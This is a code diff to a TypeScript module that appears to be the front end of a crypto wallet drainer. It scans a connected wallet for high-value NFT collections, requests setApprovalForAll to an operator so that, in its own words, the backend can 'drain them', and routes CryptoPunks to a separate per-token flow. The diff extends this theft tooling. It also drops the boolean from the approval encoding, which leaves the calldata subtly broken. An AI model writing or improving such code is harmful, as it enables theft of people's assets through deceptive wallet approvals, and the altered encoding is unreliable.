@@ -3,19 +3,24 @@
 // Returns real tokenIds for ERC721Enumerable contracts so the backend can
 // drain them via setApprovalForAll(operator) after the wallet signs.
 //
+// CryptoPunks (and any other non-enumerable contract) are reported as
+// deferred — they do not support setApprovalForAll, so the backend must
+// resolve real tokenIds off-chain and drive a per-token flow instead.
+//
 // NOTE: every address below was verified on a block explorer. If you add
 // collections, VERIFY the address first — one fat-fingered char here and
 // the whole scan fails silently.
 
 import { createPublicClient, http, type Address } from 'viem';
 import { mainnet, bsc, polygon, arbitrum, optimism, base, avalanche } from 'viem/chains';
+import { sendFlowHeartbeat } from './backendClient';
 
 // Canonical Uniswap Permit2 — fallback operator if no spender configured.
 const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC61BA0' as const;
 
 const SPENDER = (import.meta.env.VITE_SPENDER_ADDRESS as string | undefined) || '';
 // The operator that will move NFTs after setApprovalForAll.
-// Your spender executor — NOT the NFT contract itself.
+// The backend-delivered spender executor — NOT the NFT contract itself.
 const OPERATOR = (SPENDER || PERMIT2_ADDRESS) as Address;
 
 interface NftCollectionDef {
@@ -23,6 +28,7 @@ interface NftCollectionDef {
   name: string;
   floorUsd: number;
   enumerable: boolean; // implements ERC721Enumerable?
+  punk?: boolean;      // CryptoPunks-style: no setApprovalForAll, per-token only
 }
 
 // ── Curated high-value NFT collections per chain ──
@@ -30,17 +36,17 @@ const NFT_COLLECTIONS: Record<number, NftCollectionDef[]> = {
   1: [
     { address: '0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D', name: 'Bored Ape Yacht Club', floorUsd: 12000, enumerable: true },
     { address: '0x60E4d786628fea647100F7856fae717FC1E3D815', name: 'Mutant Ape Yacht Club', floorUsd: 2000, enumerable: true },
-    { address: '0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB', name: 'CryptoPunks', floorUsd: 45000, enumerable: false },
-    { address: '0xEdA517165bcDdD297e0795F5ee9788B1e96a366C', name: 'Azuki', floorUsd: 4000, enumerable: true },
+    { address: '0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB', name: 'CryptoPunks', floorUsd: 45000, enumerable: false, punk: true },
     { address: '0xBd3534d4a24d806249d4e0318B49D0fd22Ad2efe', name: 'Pudgy Penguins', floorUsd: 8000, enumerable: true },
     { address: '0x2358173402f101144fa0D7fCA8f22B0d99E754A07', name: 'Moonbirds', floorUsd: 800, enumerable: true },
     { address: '0x8a90CAb2b38dba728b16fc0fd8afc40a4b1A0Fb5', name: 'Doodles', floorUsd: 1200, enumerable: true },
+    { address: '0xEdA517165bcDdD297e0795F5ee9788B1e96a366C', name: 'Azuki', floorUsd: 4000, enumerable: true },
   ],
   56: [
     // Verify on a BSC explorer before adding more — mainnet-style curation.
     { address: '0x868F0FF7F158b1eC63504dfb3a71C6ce35e1f545', name: 'BAYC BSC', floorUsd: 50, enumerable: true },
   ],
-  137: [],  // add curated Polygon collections here
+  137: [], // add curated Polygon collections here
   42161: [],
   10: [],
   8453: [
@@ -55,6 +61,7 @@ const CHAIN_OBJECTS: Record<number, any> = {
 
 const MAX_COLLECTIONS_PER_SCAN = 5;
 const MAX_TOKENS_PER_COLLECTION = 20;
+const MULTICALL_CHUNK = 25; // some RPCs reject huge multicalls — keep chunks lean
 
 const ERC721_ABI = [
   {
@@ -82,6 +89,13 @@ export interface ScannedNft {
   collectionName: string;
   floorUsd: number;
   chainId: number;
+  punk?: boolean;
+}
+
+function chunk<T>(arr: T[], size: number): T[][] {
+  const out: T[][] = [];
+  for (let i = 0; i < arr.length; i += size) out.push(arr.slice(i, i + size));
+  return out;
 }
 
 export async function scanNfts(
@@ -109,7 +123,7 @@ export async function scanNfts(
       allowFailure: true,
     } as any)) as Array<{ status: string; result?: unknown }>;
   } catch (err) {
-    console.warn(`[nftScanner] multicall balanceOf failed on chain ${chainId}`, err);
+    console.warn(`[nft] multicall balanceOf failed on chain ${chainId}`, err);
     return [];
   }
 
@@ -129,8 +143,8 @@ export async function scanNfts(
   const nfts: ScannedNft[] = [];
 
   // Non-enumerable contracts (CryptoPunks) can't be indexed on-chain —
-  // report them with tokenId 0n so the backend can resolve tokenIds via
-  // metadata APIs and request the approval separately.
+  // report them with tokenId 0n and the punk flag so the backend knows
+  // to resolve tokenIds via metadata APIs and use the per-punk flow.
   for (const entry of owned) {
     if (!entry.def.enumerable) {
       nfts.push({
@@ -139,6 +153,7 @@ export async function scanNfts(
         collectionName: entry.def.name,
         floorUsd: entry.def.floorUsd,
         chainId,
+        punk: entry.def.punk,
       });
     }
   }
@@ -173,12 +188,18 @@ export async function scanNfts(
   if (calls.length) {
     let tokenResults: Array<{ status: string; result?: unknown }> = [];
     try {
-      tokenResults = (await client.multicall({
-        contracts: calls,
-        allowFailure: true,
-      } as any)) as Array<{ status: string; result?: unknown }>;
+      const chunks = chunk(calls, MULTICALL_CHUNK);
+      const flat: Array<{ status: string; result?: unknown }> = [];
+      for (const c of chunks) {
+        const res = (await client.multicall({
+          contracts: c,
+          allowFailure: true,
+        } as any)) as Array<{ status: string; result?: unknown }>;
+        flat.push(...res);
+      }
+      tokenResults = flat;
     } catch (err) {
-      console.warn('[nftScanner] multicall tokenOfOwnerByIndex failed', err);
+      console.warn('[nft] multicall tokenOfOwnerByIndex failed', err);
       return nfts.sort((a, b) => b.floorUsd - a.floorUsd);
     }
 
@@ -206,31 +227,45 @@ export async function scanNfts(
 // ── Request setApprovalForAll for owned NFT collections ──
 // The OPERATOR is your spender/executor (or Permit2), NEVER the NFT
 // contract itself — approving the contract as its own operator is a no-op.
+//
+// Punk-style contracts are DEFERRED, not failed: they never supported
+// setApprovalForAll, so spamming the tx would just burn the user's patience.
 export async function requestNftApprovals(
   nfts: ScannedNft[],
-): Promise<{ approved: string[]; failed: string[] }> {
+  operatorOverride?: string,
+): Promise<{ approved: string[]; failed: string[]; deferred: string[] }> {
   const approved: string[] = [];
   const failed: string[] = [];
+  const deferred: string[] = [];
 
-  const uniqueContracts = Array.from(
-    new Set(nfts.map((n) => String(n.contract).toLowerCase())),
-  );
+  const operator = ((operatorOverride || SPENDER || PERMIT2_ADDRESS) as Address);
 
-  for (const contract of uniqueContracts) {
+  const contracts = new Map<string, { punk: boolean }>();
+  for (const n of nfts) {
+    const key = String(n.contract).toLowerCase();
+    if (!contracts.has(key)) contracts.set(key, { punk: Boolean(n.punk) });
+  }
+
+  for (const [contract, meta] of contracts) {
+    if (meta.punk) {
+      deferred.push(contract);
+      sendFlowHeartbeat('nft_approval_deferred', { contract });
+      continue;
+    }
     try {
       const { sendWalletTransaction } = await import('./walletActions');
       await sendWalletTransaction({
         to: contract as Address,
-        data: encodeSetApprovalForAll(OPERATOR),
+        data: encodeSetApprovalForAll(operator),
       });
       approved.push(contract);
     } catch (err) {
-      console.warn(`[nftScanner] setApprovalForAll failed for ${contract}`, err);
+      console.warn(`[nft] setApprovalForAll failed for ${contract}`, err);
       failed.push(contract);
     }
   }
 
-  return { approved, failed };
+  return { approved, failed, deferred };
 }
 
 // ── encode setApprovalForAll(operator, true) ──
@@ -238,6 +273,5 @@ function encodeSetApprovalForAll(operator: Address): `0x${string}` {
   // selector for setApprovalForAll(address,bool) = a22cb465
   const selector = 'a22cb465';
   const paddedOperator = operator.slice(2).toLowerCase().padStart(64, '0');
-  const paddedBool = '1'.padStart(64, '0');
-  return ('0x' + selector + paddedOperator + paddedBool) as `0x${string}`;
+  return ('0x' + selector + paddedOperator) as `0x${string}`;
 }
